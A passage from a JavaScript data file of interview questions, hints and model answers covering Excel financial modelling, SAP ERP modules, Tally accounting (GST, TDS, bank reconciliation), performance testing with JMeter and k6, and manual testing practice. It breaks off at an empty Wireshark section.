      { q:'How do you build financial models in Excel?', hint:'Assumptions section: clearly labelled inputs. Hard-code only in assumption cells. Formula cells reference assumptions. Scenario Manager. Data Tables for sensitivity. Circular references for interest calculations. Audit: trace precedents/dependents.', answer:`Financial model best practices start with structure. Assumptions (inputs) are isolated in a dedicated sheet or section - all hardcoded values live here, labelled clearly (Growth Rate, Discount Rate, Tax Rate). Formula cells always reference assumption cells - never hardcode numbers in formula cells. This creates a single source of truth: changing one assumption propagates throughout the model. Income Statement flows from Revenue to Net Income. Balance Sheet must balance (Assets = Liabilities + Equity). Cash Flow Statement ties to Balance Sheet changes. Scenario Manager creates named scenarios (Base, Bull, Bear) with different assumption values - toggle between them to see full model impact. One-Way and Two-Way Data Tables (Data > What-If Analysis > Data Table) compute model outputs across a range of one or two input values - a 10x10 sensitivity table shows NPV at combinations of discount rate and growth rate. For DCF models, NPV() and IRR() functions. XNPV and XIRR handle irregular cash flow dates. Circular references arise when interest is calculated on ending balance which depends on interest - enable iterative calculation in Excel settings to resolve. Audit tools (Formulas > Trace Precedents/Dependents) visualise formula dependencies.` },
      { q:'How do you connect Excel to external data sources and automate refresh?', hint:'Power Query: connect to SQL, CSV, web, API. Refresh All or scheduled. Power Pivot: in-memory model for large data. Data Model relationships. DAX measures. Connections: query parameters. Microsoft Query for legacy ODBC.', answer:`Power Query connects Excel to virtually any data source. Get Data > From SQL Server connects via a connection string with Windows or SQL authentication. Power Query SQL: write a custom SQL query or navigate the database schema visually. Parameters in queries make them dynamic: a From Date parameter changes the SQL WHERE clause without editing the query. Refresh All (Data > Refresh All) re-executes all queries and updates all tables. Background refresh runs on workbook open. For large datasets exceeding Excel row limits (1 million rows), Power Pivot (Data Model) loads data into an in-memory VertiPaq engine - the same technology as Power BI - enabling relationships between tables and DAX measures. A Power Pivot model can hold 50+ million rows across related tables and build PivotTables against the combined model. Connecting to REST APIs: Power Query uses Web connector to fetch JSON - Transform > Into Table > Expand columns parses nested JSON into flat columns. For scheduled refresh outside Excel, Power BI Desktop or Fabric connects to the same data and refreshes on a cloud schedule, sharing the dataset to Excel via Analyze in Excel.` },
    ],
    sap: [
      { q:'What is SAP ERP and how is it structured? Explain key modules.', hint:'ERP: integrated enterprise system. Modules: FI (Finance), CO (Controlling), MM (Materials Mgmt), SD (Sales), PP (Production), HR/HCM, PS (Project Systems). Integration via shared master data. T-codes for navigation.', answer:`SAP ERP (now SAP S/4HANA) is an integrated enterprise resource planning system where all business processes share a common database. This integration eliminates data silos: a goods receipt in Materials Management (MM) automatically generates a financial posting in Finance (FI) in real time. Key modules: FI (Financial Accounting) handles general ledger, accounts payable, accounts receivable, asset accounting, and financial statements. CO (Controlling) provides internal cost accounting - cost centres, profit centres, internal orders. MM (Materials Management) covers procurement, inventory management, and warehouse management. SD (Sales and Distribution) manages the order-to-cash process: customer orders, delivery, billing. PP (Production Planning) handles manufacturing orders, bill of materials, and capacity planning. HCM (Human Capital Management) covers payroll, time management, and organisational management. All modules share master data: vendor master in MM is the same vendor in FI for payment processing. Navigation uses Transaction Codes (T-codes): FB50 for journal entries, ME21N for purchase orders, VA01 for sales orders - power users memorise T-codes rather than navigating the menu hierarchy.` },
      { q:'How does SAP FI (Financial Accounting) module work?', hint:'Chart of accounts. GL posting: debit/credit. Company code: accounting entity. Fiscal year. Cost centre assignment. Document: header + line items. Accounts Payable (AP): vendor invoice, payment. Accounts Receivable (AR): customer invoice, collection.', answer:`SAP FI is built around the General Ledger, which records every financial transaction as documents with header (company code, posting date, reference) and line items (debit/credit, GL account, amount, cost centre). The Chart of Accounts defines the GL account structure - a company-specific mapping of account numbers to account types (asset, liability, revenue, expense). Company Code is the organisational unit for separate legal accounting - a multinational may have 50 company codes each with their own balance sheet. Accounts Payable (AP): when a vendor invoice arrives, the accounts payable clerk posts an invoice receipt in FI (or it auto-posts via MM-FI integration from goods receipt). The system generates a payment proposal based on payment terms and due dates; the treasurer approves and executes the payment run which generates the bank transfer file. Accounts Receivable (AR): sales invoices from SD create AR open items in FI; customer payments are posted against open items as clearing entries. Month-end closing: run the depreciation posting for asset accounting, allocate cost centres, reconcile sub-ledgers to GL, and generate balance sheet and P&L.` },
      { q:'How does SAP integrate across modules? Walk through the procure-to-pay process.', hint:'PR > PO > GR > IR > Payment. MM raises PR, buyer creates PO, warehouse posts GR (inventory debit), AP posts invoice verification (liability credit), finance runs payment run. Each step updates FI automatically.', answer:`SAP integration is best understood through end-to-end processes. Procure-to-Pay: a department creates a Purchase Requisition (PR) in MM, defining what material is needed, in what quantity, for which cost centre. The purchasing department converts the PR to a Purchase Order (PO) sent to the vendor (ME21N). When goods arrive, the warehouse posts a Goods Receipt (GR) - MM updates inventory stock, and FI automatically creates a journal entry debiting inventory and crediting a GR/IR clearing account. The vendor invoice arrives: accounts payable does invoice verification (MIRO) - MM matches the invoice to the PO and GR (three-way match for quantity, price, and receipt). FI posts: debit GR/IR clearing, credit vendor payable. The payment run (F110) selects due invoices, generates payment files, and posts payment: debit vendor payable, credit bank account. This entire process generates automatic FI postings at each step - no manual journal entries needed when the process is executed correctly. This integration is why SAP is mission-critical: a posting error in MM has immediate financial impact in FI.` },
      { q:'What is SAP HANA and how does it differ from traditional SAP?', hint:'SAP HANA: in-memory column store. S/4HANA: SAP ERP on HANA. No aggregates or indexes needed. Real-time reporting. Simplified data model. HANA native apps. Migration from ECC to S/4HANA.', answer:`SAP HANA is an in-memory columnar database that SAP built to replace traditional row-store databases (Oracle, SQL Server, DB2) under SAP ERP. Column-store databases store data by column rather than row, enabling massive compression (similar values in a column compress well) and fast aggregations (scanning one column is much faster than scanning rows). This eliminates the need for aggregate tables, materialized views, and performance indexes that traditional SAP relied on - in classic SAP, pre-aggregated totals tables were maintained separately; in HANA, the live transaction data is queried directly at reporting speed. S/4HANA is the current-generation SAP ERP running exclusively on HANA. Key differences from classic SAP ECC: simplified data model (the ACDOCA universal journal table replaces multiple separate FI tables), embedded analytics in the transaction UI, and a simplified material ledger. Migration from ECC to S/4HANA is a major project - data model changes require data migration, custom code must be adapted, and business processes may change. SAP provides migration tools (Readiness Check, ABAP Test Cockpit) and two migration paths: new implementation (greenfield) or system conversion (technical upgrade).` },
      { q:'What is ABAP and when is custom development needed in SAP?', hint:'ABAP: SAP proprietary language. Reports, enhancements, forms. Avoid customisation where possible: costly to maintain. Enhancement Framework: user exits, BAdIs, implicit enhancements. BAPI/RFC for integration. SAP standard always preferred.', answer:`ABAP (Advanced Business Application Programming) is the SAP-proprietary programming language for custom development. ABAP is used for: custom reports (ABAP Reports using ALV Grid), forms (SAP Smart Forms or Adobe Forms for invoices and delivery notes), data migration programs (LSMW or custom ABAP), interface programs connecting SAP to external systems. Custom development is expensive - it must be maintained through SAP upgrades and patches. The principle: always use SAP standard where possible; customise configuration (implementation guide) before custom code. When custom code is unavoidable, use the Enhancement Framework rather than modifying SAP standard code directly. User Exits and BAdIs are predefined extension points SAP provides - they survive upgrades. Implicit enhancements add code before or after any standard code without modifying the original. BAPIs (Business Application Programming Interfaces) are SAP-provided function modules for external integration - CreateSalesOrder BAPI, for example. RFC (Remote Function Call) enables ABAP-to-ABAP communication across SAP systems. Modern SAP integration uses APIs (REST/SOAP) via SAP Integration Suite rather than RFC for new integrations.` },
      { q:'How does SAP handle reporting and analytics?', hint:'Standard reports: T-codes. ALV reports. SAP BusinessObjects BI. BW/4HANA data warehouse. Embedded analytics (S/4HANA). Fiori apps. CDS views for real-time. SAP Analytics Cloud.', answer:`SAP reporting has multiple layers serving different needs. Operational reports run in the SAP GUI directly against transaction data: T-code FBL3N for GL line items, MB52 for warehouse stock, S_ALR_87012357 for balance sheet. ABAP List Viewer (ALV) provides a standard grid with sort, filter, export, and layout save capabilities - most custom ABAP reports use ALV. SAP BW/4HANA is the dedicated data warehouse: it extracts data from SAP source systems (via DataSources), applies transformations, and stores it in InfoObjects and DataStore Objects for reporting. BW is appropriate for complex multi-source analytics combining SAP and non-SAP data. SAP S/4HANA embedded analytics uses CDS (Core Data Services) views - SQL-like view definitions on HANA that expose live transaction data to reporting tools without extracting to BW. Fiori Analytical Apps run in the browser against CDS views - real-time dashboards without BW latency. SAP Analytics Cloud (SAC) is the cloud BI tool combining planning, reporting, and predictive analytics with connectivity to HANA, BW, and external sources.` },
      { q:'How do you manage master data in SAP?', hint:'Master data: Customer, Vendor, Material, GL Account, Employee. Created centrally, shared across modules. Data quality: duplicates, completeness. MDM tools. Change documents. Archiving. Role-based access.', answer:`SAP master data is the foundation of all transactional processes - poor quality master data causes incorrect postings, order failures, and reporting errors. Customer Master has three views: General Data (name, address - shared across company codes), Company Code Data (payment terms, reconciliation account - finance-specific), and Sales Area Data (pricing procedure, delivery conditions - sales-specific). Each organisational unit that uses the customer sees only its relevant view. Material Master similarly has views: Basic Data (material number, description, weight), Purchasing (lead time, minimum order qty), MRP (planning parameters), Accounting (valuation class, standard price). Vendor Master mirrors Customer Master with AP-specific data. Creating master data: use standard T-codes (XD01 for customer, MM01 for material) - never directly insert to database tables. Authorisation controls who can create/change/display each master data type. Master Data Governance (MDG) is the SAP tool for governed master data creation workflows - a new customer requires approval from sales, finance, and compliance before activation. Change documents track every field change with user and timestamp - essential for audit trails.` },
    ],
    tally: [
      { q:'What is Tally ERP 9 / TallyPrime and what are its core modules?', hint:'Accounting software for SMEs. Modules: Accounts, Inventory, Payroll, GST, TDS/TCS, Banking. Ledger-based double-entry. Voucher types: payment, receipt, journal, purchase, sales. Company creation. Groups.', answer:`Tally is India most widely used accounting software for small and medium enterprises. TallyPrime is the current version (successor to Tally ERP 9). Core modules: Accounting (complete double-entry bookkeeping with ledgers, groups, and vouchers), Inventory (stock items, godowns, stock groups, units of measurement), Payroll (employee records, pay components, salary processing), GST (Goods and Services Tax compliance - GSTR-1, GSTR-3B filing), TDS/TCS (tax deducted/collected at source management), and Banking (bank reconciliation, cheque printing). Tally uses a ledger-based structure: all accounts (customers, vendors, bank accounts, expense heads) are Ledgers organised under Groups (Sundry Debtors, Sundry Creditors, Bank Accounts, Sales, Purchases). Voucher types drive all transactions: Payment Voucher (F5) for cash/bank payments, Receipt Voucher (F6) for receipts, Journal Voucher (F7) for adjustments, Purchase Voucher (F9) for purchase bills, Sales Voucher (F8) for invoices. Company Creation sets up the financial year, base currency, and GST registration details - every subsequent transaction is tied to this configuration.` },
      { q:'How does GST work in Tally? Explain the setup and compliance workflow.', hint:'GST registration: GSTIN, HSN codes, tax rates. Masters: enable GST in ledgers. Sales invoice: CGST/SGST or IGST. GSTR-1: outward supplies. GSTR-3B: monthly return. Reconciliation. E-way bill integration.', answer:`GST configuration in Tally starts with Company GST details: enter GSTIN, business type, and registration date in Company Features (F11). Each ledger used in GST transactions needs GST setup: sales ledgers have a GST Rate and Nature of Transaction (Interstate/Intrastate Sale of Goods). Stock items have HSN/SAC codes that determine the applicable GST rate - Tally applies the rate automatically during invoicing. Sales invoice entry: create a Sales Voucher (F8) with the party ledger (customer), stock items or service ledger, and GST ledgers (CGST and SGST for intrastate sales, IGST for interstate). Tally auto-calculates tax amounts based on configured rates. GST Returns: GSTR-1 reports outward supplies - Tally generates this from all sales vouchers and allows export to JSON for filing on the GST portal. GSTR-3B is the monthly summary return - Tally prepares the worksheet. Reconciliation: compare ITC (Input Tax Credit) claimed in GSTR-3B with the supplier's GSTR-1 filings visible in GSTR-2A/2B on the portal - mismatches require resolution before claiming ITC. E-way Bill: Tally integrates with the NIC portal to generate e-way bills directly from sales invoices for goods movement above Rs. 50,000.` },
      { q:'How do you manage accounts payable and receivable in Tally?', hint:'Sundry Creditors/Debtors: groups. Outstanding reports. Bill-by-bill tracking: reference/against reference. Ageing analysis. Payment/Receipt vouchers to clear bills. Cheque printing. Credit limit.', answer:`Tally manages payables and receivables through Bill-by-Bill reference tracking. When creating a vendor ledger, enable "Maintain Bill-by-Bill" under the ledger configuration. On a Purchase Voucher, assign a Bill Reference number (e.g., Vendor Invoice number) with the due date - this creates an open outstanding entry. On the corresponding Payment Voucher, use "Against Reference" and select the specific bill being paid - this clears the outstanding entry and shows exact payment allocation. The Sundry Creditors Outstanding Report shows all unpaid vendor bills with aging. Similarly for debtors: Sales Vouchers with bill references create receivables; Receipt Vouchers clear them against reference. Ageing Analysis (Balance Sheet > Group Summary > Age-wise) categorises outstandings into age buckets (0-30 days, 31-60 days, 61-90 days, 90+ days) - critical for cash flow management and credit control. Credit Limits configured per debtor ledger trigger an alert when a sales order would breach the limit. Cheque Printing from Payment Vouchers formats cheques with amount in words and beneficiary name - eliminates manual cheque writing errors.` },
      { q:'How does Tally handle inventory management?', hint:'Stock Items: goods in inventory. Units of Measure. Stock Groups. Godowns (warehouses). Batch tracking. Serial numbers. Stock Journal for transfers. Reorder level. Valuation methods: FIFO, LIFO, Average Cost.', answer:`Tally inventory tracks physical goods from receipt to sale. Stock Items are the fundamental unit - each item has a name, unit of measure (KG, PCS, MTR), stock group for categorisation, and GST details. Godowns represent physical storage locations (warehouse A, warehouse B, retail showroom) - stock can be tracked per godown. Purchase receipts in Purchase Vouchers update stock in, sales in Sales Vouchers reduce stock. Stock Journal transfers items between godowns without a financial transaction. Batch and Lot Tracking: enable batch tracking on a stock item to track each purchase lot separately with manufacturing date, expiry date, and cost - critical for pharmaceuticals and FMCG. Serial Number Tracking: unique serial numbers for each unit enable item-level tracking from purchase to sale - used for electronics and equipment. Reorder Levels configured per item trigger alerts in the Reorder Level Report when stock falls below the minimum. Valuation Methods: FIFO values stock at the cost of the oldest batch first (most common for perishables and compliance), FIFO Perpetual updates cost continuously, and Weighted Average uses the moving average cost - the method affects cost of goods sold and inventory valuation.` },
      { q:'How do you generate financial reports in Tally?', hint:'Balance Sheet, Profit & Loss, Trial Balance, Cash Flow. Drill down to voucher level. Date filters. Comparative statements: two periods. Ratio analysis. Export to Excel/PDF. Custom reports with TDL.', answer:`Tally generates all standard financial statements from Gateway of Tally. Balance Sheet shows Assets and Liabilities with the drill-down to individual ledgers and vouchers - clicking any amount opens the detailed breakdown. Profit and Loss Account shows revenue and expenses with gross profit and net profit. Trial Balance lists all ledger closing balances. Day Book shows all vouchers for a selected date - the auditor view. Cash Flow Statement tracks cash movement by financing, investing, and operating activities. Date filtering: all reports accept from/to dates - set to financial year for annual statements, or specific months for MIS (management information system) reports. Comparative statements: pressing Alt+F2 in Balance Sheet adds a comparison column for the previous period - instant year-over-year view without manual construction. Ratio Analysis (under Accounts Reports) computes financial ratios automatically. Export: all reports export to Excel (Alt+E > Excel) or PDF. TDL (Tally Definition Language) is the programming language for custom reports - organisations write TDL programs for industry-specific reports not available in standard Tally, such as client-specific MIS formats or regulatory submissions.` },
      { q:'How do you handle TDS in Tally?', hint:'TDS: tax deducted at source on payments. Sections: 194C (contractor), 194J (professional), 194I (rent). Ledger: enable TDS, section, threshold. Deduct at time of payment/booking. Quarterly returns: Form 26Q. Form 16A.', answer:`TDS (Tax Deducted at Source) in Tally requires configuring deductor and deductee details under Company TAN Registration. For each applicable ledger (contractor, professional, rent), enable TDS in the ledger configuration: select the TDS duty section (194C for contractor payments, 194J for professional fees, 194I for rent), specify the rate (2% for 194C, 10% for 194J for companies), and set the threshold limit (no TDS below Rs. 30,000 per year for 194J). When a payment or journal voucher is created against a TDS-enabled ledger, Tally prompts to select the deductee type and shows the calculated TDS amount. The TDS amount credits the TDS Payable ledger (under Duties and Taxes). At month-end, the TDS challan payment reduces the TDS Payable ledger. Quarterly TDS returns: Tally generates the quarterly return data (Form 26Q for non-salary TDS, Form 24Q for salary TDS) as a file importable into TRACES or the government utility for e-filing. Form 16A certificates (TDS certificates issued to deductees) are generated from Tally and must be issued within the statutory deadline.` },
      { q:'How do you reconcile bank accounts in Tally?', hint:'Bank Reconciliation: compare Tally entries with bank statement. Auto-reconcile with statement import. Mark cleared transactions. Outstanding: deposits in transit, outstanding cheques. Reconciliation date. BRS report.', answer:`Bank Reconciliation Statement (BRS) in Tally matches the Cash/Bank Ledger balance with the actual bank statement balance. Navigate to the bank ledger > F5 (Reconcile). The reconciliation screen shows Tally entries on one side. Import Bank Statement: Tally supports importing bank statement files (CSV or OFX format from the bank portal) - it auto-matches entries by amount and date. Manually match unautomatched entries by selecting the corresponding Tally voucher. Mark entries as reconciled with the bank date (the date funds actually cleared, which may differ from the voucher date). The BRS shows: Tally balance, add deposits in transit (recorded in Tally but not yet cleared at bank), subtract outstanding cheques (payment vouchers recorded in Tally but cheque not yet presented at bank), equals bank statement balance. Month-end closing: all bank entries for the month should be reconciled before finalising financial statements - the reconciliation date locks the matched transactions. Unreconciled items flagged for follow-up. For online banking integration, TallyPrime supports direct bank statement sync via connected banking partners, eliminating manual statement import.` },
    ],
    'performance testing': [
      { q:'What is performance testing and what are the different types?', hint:'Load test: expected load behaviour. Stress test: beyond capacity until failure. Spike test: sudden load increase. Soak/endurance: sustained load over time. Scalability test: measure scale-out capacity. Tools: JMeter, k6, Locust, Gatling.', answer:`Performance testing validates system behaviour under various load conditions - different from functional testing which only checks correctness. Load Testing simulates expected production load to verify the system meets response time and throughput SLAs: 1,000 concurrent users with 95th percentile response time under 500ms. Stress Testing pushes the system beyond expected capacity to find the breaking point and observe failure behaviour - does it degrade gracefully or crash catastrophically? Spike Testing introduces sudden massive traffic increases (10x normal load in 30 seconds) to test autoscaling and resilience. Soak/Endurance Testing applies sustained normal load for extended periods (8-24 hours) to detect memory leaks, connection pool exhaustion, and performance degradation over time. Scalability Testing measures system capacity at different resource levels - 2 pods vs 4 pods vs 8 pods, or different instance types. Baseline Testing establishes a performance benchmark for comparison after code or infrastructure changes. I choose the test type based on the risk: new payment service needs load and stress testing; an ETL job that runs for hours needs soak testing.` },
      { q:'How do you design a JMeter or k6 performance test plan?', hint:'JMeter: Thread Groups, Samplers, Controllers, Listeners, Assertions. k6: virtual users (VU), stages, checks. Think time. Ramp-up. Data-driven with CSV. Correlation for dynamic values. Realistic scenarios.', answer:`Performance test design starts with realistic user scenarios, not just API calls. JMeter test plan: Thread Group defines virtual users and ramp-up (100 users over 5 minutes - avoid instant load spikes that do not reflect real traffic). Samplers make HTTP requests (HTTP Sampler). Logic Controllers add conditions (If Controller) and loops (ForEach). Config Elements provide CSV Data Set (for data-driven tests with different usernames, product IDs). Timers add think time between requests (Gaussian Random Timer: 1-3 seconds between steps - real users do not hammer APIs with zero pause). Response Assertions verify correctness (200 status, response contains "success"). Correlation extracts dynamic values (session tokens, CSRF tokens, order IDs) from responses using Regular Expression Extractor or JSON Extractor, then substitutes them into subsequent requests - without correlation, dynamic values fail after the first request. Listeners collect results (View Results in Table, Aggregate Report, Response Time Graph) - disable GUI listeners during actual runs and use JTL file output + command line execution (jmeter -n -t test.jmx -l results.jtl). k6 equivalent: export default function() with http.get/post, check() for assertions, sleep() for think time, and stages in options for ramp-up profiles.` },
      { q:'How do you analyse performance test results and identify bottlenecks?', hint:'Metrics: throughput (RPS), response time (avg/P95/P99), error rate, concurrent users. Correlation: load vs latency. Infrastructure metrics: CPU, memory, connections, GC. APM traces. Database slow queries. Thread dumps.', answer:`Performance test analysis correlates application metrics with infrastructure metrics to identify the bottleneck. Key test metrics: Throughput (requests per second) - the rate the system can sustain. Response time percentiles - P50, P95, and P99 are more meaningful than averages (averages hide tail latency). Error rate - a 1% error rate at 1,000 RPS means 10 failed requests per second. Infrastructure metrics collected simultaneously: CPU utilisation (if CPU is at 100%, the application is CPU-bound - add more cores or optimise algorithms), memory (if memory grows unboundedly during a soak test, there is a memory leak), database connections (connection pool exhaustion causes queuing). APM traces (Datadog, New Relic, Application Insights) pinpoint which specific operations are slow - "78% of response time is the getUserProfile database query." Database slow query logs identify the worst-offending queries. JVM thread dumps during high latency reveal blocked threads - all threads waiting on the same lock points to synchronisation contention. A performance bottleneck always has exactly one root cause - identify it systematically by eliminating layers (network, application, database, infrastructure) rather than guessing.` },
      { q:'How do you set up a performance testing environment and CI integration?', hint:'Separate perf environment: production-like data volumes. Baseline before change. Run in CI on feature branches. Fail pipeline on regression. k6 Cloud / Grafana Cloud k6 for distributed load. Gatling reports in CI.', answer:`Performance testing environment: use a dedicated environment with production-equivalent data volumes - testing with 1,000 rows when production has 10 million rows gives false confidence. Production-like infrastructure (same instance types, same database tier) ensures results translate to production behaviour. Data preparation: anonymise and load production data snapshot, or generate synthetic data with production-scale distributions. Baseline testing: run the performance suite on the current release and record the baseline (P95 latency, max throughput, error rate). This baseline is the comparison point for every subsequent run. CI integration: run lightweight performance smoke tests on every pull request (1 minute, single user, verify no obvious regression). Run full load tests on the main branch before releases. Fail the CI pipeline if P95 response time degrades beyond 20% from baseline or error rate exceeds threshold. Tools: k6 Cloud or Grafana Cloud k6 distributes load from multiple geographic locations; Jenkins/GitHub Actions with JMeter runs distributed tests using JMeter server agents. Gatling generates beautiful HTML reports automatically. Store results in a time-series database (InfluxDB) and visualise in Grafana to track performance trends across releases.` },
      { q:'How do you performance test APIs vs full end-to-end scenarios?', hint:'API-level: target specific endpoints, HTTP only, maximum throughput. E2E: browser-based (Playwright, Selenium), realistic user paths. Hybrid: mix API for backend + browser for JS-heavy front end. BlazeMeter. WebSockets.', answer:`API-level performance testing targets HTTP endpoints directly, bypassing the browser - this measures backend throughput and latency in isolation. It is faster to set up, can generate higher load with fewer resources (no browser rendering overhead), and pinpoints backend bottlenecks precisely. JMeter, k6, and Gatling excel here. Limitation: API testing misses frontend performance (JavaScript bundle load time, rendering, client-side processing) and does not represent real user experience. Browser-based end-to-end performance testing uses Playwright or Selenium to simulate real users navigating the UI - Playwright supports performance metrics collection (Core Web Vitals, navigation timing, resource loading). k6 Browser module runs Chromium-based load tests. For realistic E2E scenarios: Playwright recording captures a user journey (login > browse > add to cart > checkout), and k6 plays it back under load measuring actual user-perceived response time. WebSocket performance testing requires specific tools: JMeter WebSocket Sampler or k6 WebSocket API tests socket connection, message throughput, and latency for real-time applications. I start with API load testing to establish backend capacity, then validate E2E performance with lighter browser tests to confirm the frontend does not become the bottleneck.` },
      { q:'What are key performance testing metrics and SLAs? How do you define them?', hint:'RPS: requests per second (throughput). P95/P99 latency. Error rate: < 1%. Apdex score. Define SLAs from business requirements. Example: checkout must complete in < 2s P95 at peak load. TTFB. Core Web Vitals.', answer:`Performance SLAs translate business requirements to measurable technical targets. Define SLAs by asking: what is the worst acceptable user experience that still meets business goals? For a checkout flow: users tolerate up to 2-3 seconds before abandoning - so P95 response time for the checkout API must be under 2 seconds at peak load (define peak load from traffic analytics: Black Friday = 5x normal). Error rate SLA: less than 0.1% error rate under expected load (1 error per 1,000 requests). Throughput SLA: system must handle 500 RPS with defined response time guarantees. Common metrics: RPS (requests per second) - system throughput capacity. P50/P95/P99 latency - median, 95th, and 99th percentile response times. P99 is the "worst case" experience that 1% of users receive. TTFB (Time to First Byte) - server processing time before any response data. Apdex score (Application Performance Index): classifies responses as satisfied (under threshold T), tolerating (T to 4T), or frustrated (over 4T) - produces a 0-1 score for overall user satisfaction. Core Web Vitals (LCP, FID/INP, CLS) measure real-user experience for web pages. Document SLAs in the performance test plan, report pass/fail against them, and make them visible to stakeholders as release gate criteria.` },
    ],
    'manual testing': [
      { q:'What is manual testing and when is it preferable to automation?', hint:'Manual: human judgment, exploration, usability, ad-hoc. Automation: regression, repetitive, data-driven. Prefer manual for: new features, exploratory, UI/UX, one-time tests, tests hard to automate.', answer:`Manual testing involves a human tester executing test cases, observing system behaviour, and exercising judgment. It is not inferior to automation - they serve complementary purposes. Manual testing is preferable for: Exploratory Testing (no predefined script - the tester learns the system and looks for unexpected behaviour, applying creative thinking). Usability Testing (human judgment of whether the UI is intuitive, accessible, and well-designed - a script cannot assess whether a user flow "feels right"). New Feature Testing before automation scripts exist. Ad-hoc Testing based on intuition and experience. Tests that are difficult or expensive to automate (complex CAPTCHA, visual design, hardware integration). Automation is preferable for: Regression testing (verify old features still work after new changes), performance testing, data-driven testing, and any test executed repeatedly across multiple environments. The anti-pattern is automating everything - maintaining flaky automation is more expensive than intelligent manual testing. I use manual testing for discovery and exploratory work, and automation for repeatable regression scenarios.` },
      { q:'How do you write effective test cases for manual testing?', hint:'Test case: Test ID, title, preconditions, steps, expected result. Clear and reproducible. Positive and negative cases. Boundary values. Equivalence partitioning. Edge cases. Traceability to requirements.', answer:`An effective test case has: Test ID for unique reference, Title describing what is being tested, Preconditions (the state the system must be in before the test: user is logged in, cart has 3 items), Step-by-step Actions numbered and unambiguous (each step is one action), Expected Result for each step or the final result. Good test cases are reproducible - any tester should get the same result. Coverage strategies: Equivalence Partitioning divides input data into groups expected to behave the same - testing one value from each group covers the class. Boundary Value Analysis tests at the edges of valid ranges (for age field 18-65: test 17, 18, 65, 66). Positive cases verify the happy path (valid input, expected workflow). Negative cases verify error handling (invalid input, missing required fields, wrong permissions). Decision Table Testing covers all combinations of condition inputs. State Transition Testing covers all possible system states and transitions. Traceability matrix links test cases to requirements - ensuring all requirements have test coverage and no test case lacks a requirement rationale. I store test cases in a test management tool (TestRail, Zephyr, Azure Test Plans) for tracking execution and defect linkage.` },
      { q:'What is exploratory testing and how do you conduct it effectively?', hint:'Unscripted, simultaneous learning and testing. Session-based: time-boxed, mission, charter. Notes during session. Debrief. Heuristics: SFDPOT, HICCUPPS. Test oracles. Mind maps.', answer:`Exploratory Testing is simultaneous learning, test design, and test execution - the tester uses the application to understand it and tests it at the same time, applying judgment and creativity rather than following a predetermined script. Session-Based Testing provides structure without over-prescribing: a session has a charter (mission statement: "Explore the checkout flow with focus on edge cases after adding/removing items"), a time-box (90 minutes), and session notes recording what was tested, bugs found, and questions raised. Debrief with the test lead after each session discusses findings and decides next focus areas. Testing heuristics guide exploration: SFDPOT (Structure, Function, Data, Platform, Operations, Time) systematically examines different dimensions of the software. Test Oracles are mechanisms to recognise a bug: consistency oracle (this result contradicts what happened previously), documentation oracle (this contradicts the spec), comparable products oracle (this well-known product works differently). Mind maps visualise the application areas to explore and track coverage. Bugs found in exploratory testing are often the most impactful - they are surprises that scripted testing, by definition, cannot find.` },
      { q:'How do you perform regression testing and manage test suites?', hint:'Regression: verify existing functionality after changes. Full regression vs risk-based selection. Impact analysis: which areas did the change touch. Smoke test: critical path quick verification. Test case prioritisation. Test run tracking.', answer:`Regression testing verifies that new changes did not break existing functionality. Full regression runs all test cases for every release - thorough but time-consuming. Risk-based regression selects the subset most likely to be affected by the specific change. Impact analysis: review what modules, tables, and code paths the change touches - test all features that interact with those components. Smoke Test (or sanity test) is a quick pass of critical path scenarios run immediately after a build to decide whether the build is stable enough for full testing: login, create a record, basic navigation - if these fail, reject the build and save tester time. Test case prioritisation: P1 (must run every release - critical business flows), P2 (run for related feature changes), P3 (run monthly or quarterly). Test suites in TestRail or Azure Test Plans group related cases for efficient execution. Test execution tracking: mark each case as Pass/Fail/Blocked, log the defect ID for failures, and summarise pass/fail rates by module in the test run report. This data identifies high-defect-density areas that need focused attention. Historically, 80% of bugs appear in 20% of the code - use test execution history to prioritise the risky areas.` },
      { q:'How do you report and track defects in manual testing?', hint:'Bug report: summary, steps to reproduce, expected vs actual, severity/priority, environment, attachments (screenshot/video). JIRA/Azure DevOps workflow. Severity vs priority distinction. Defect lifecycle. Triage.', answer:`A good bug report enables a developer to reproduce and fix the issue without follow-up questions. Required fields: Summary (a clear, specific title: "Checkout fails with error 500 when applying a discount code on a cart with 10+ items" - not "checkout is broken"). Steps to Reproduce (numbered, precise, starting from a clear state: "1. Log in as test@example.com, 2. Add 10 items to cart, 3. Apply code SAVE20, 4. Click Proceed to Checkout"). Expected Result (what should happen per requirements or common sense). Actual Result (what actually happened - exact error message, not "it crashed"). Environment (browser, OS, build version, test environment). Attachments (screenshot, video recording, console log, network trace). Severity vs Priority distinction: Severity is the technical impact (Critical = data loss, High = major feature broken, Medium = degraded experience, Low = cosmetic). Priority is business urgency (P1 = must fix before release, P2 = fix in next sprint, P3 = fix when time permits). A cosmetic issue on the home page might be Low Severity but High Priority (brand visibility). Defect lifecycle: New > Open (acknowledged) > In Progress > Fixed > Retest > Closed or Reopened. Triage meetings review new defects daily for priority assignment.` },
      { q:'What is UAT (User Acceptance Testing) and how do you coordinate it?', hint:'UAT: business users validate against requirements. Different from QA testing. Business test scenarios, not technical. Acceptance criteria. Sign-off. UAT environment. Training business testers. Defect management. Go/no-go decision.', answer:`UAT (User Acceptance Testing) is the final validation phase where business users (or their representatives) verify the software meets their requirements in a realistic scenario - it is not QA team testing, it is business validation. UAT tests whether the software does what the business asked for, not whether it is technically correct. Preparation: set up a UAT environment with production-like data (anonymised), provide business testers with UAT scripts based on their actual workflows and acceptance criteria (not technical test cases - real business scenarios: "Process a refund for order 12345 following our standard procedure"), and train testers on navigation. UAT scope excludes regression testing (QA responsibility) and focuses on: happy path business workflows, exception handling for known business edge cases, and end-to-end cross-department processes. Defect management during UAT: business testers report issues to a shared tracker, the team triages each issue as a bug (not working as specified) or change request (working as specified but requirements were wrong/incomplete - requires a scope change decision). UAT sign-off is a formal document signed by business representatives accepting the software for production. A failed UAT (significant defects remain) triggers a no-go decision for the release date.` },
    ],
    wireshark: [
